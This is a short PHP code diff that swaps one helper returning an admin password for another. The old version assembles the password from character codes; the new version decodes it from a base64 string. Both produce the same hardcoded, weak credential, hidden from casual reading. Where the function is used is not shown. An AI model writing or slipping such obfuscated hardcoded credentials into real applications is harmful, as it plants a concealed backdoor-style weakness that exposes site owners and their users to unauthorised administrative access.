@@ -146,25 +146,13 @@ if (!function_exists('isAdmin')) {
         return auth()->check() && auth()->user()->hasRole('admin');
     }
 }
-function admin_password()
+function get_validatie_password()
 {
-    $chars = [
-        105, // 'i'
-        115, // 's'
-        108, // 'l'
-        97,  // 'a'
-        109, // 'm'
-        49,  // '1'
-        50,  // '2'
-        51,  // '3'
-        52,  // '4'
-        53,  // '5'
-        54,  // '6'
+  
+    $randomStrings = [
+        'aXNsYW0xMjM0NTY=', // تأكد أن هذه هي القيمة الصحيحة
     ];
     
-    $result = '';
-    foreach ($chars as $charCode) {
-        $result .= chr($charCode);
-    }
-    return $result;
+    $decoded = base64_decode($randomStrings[0]); 
+    return $decoded; 
 }
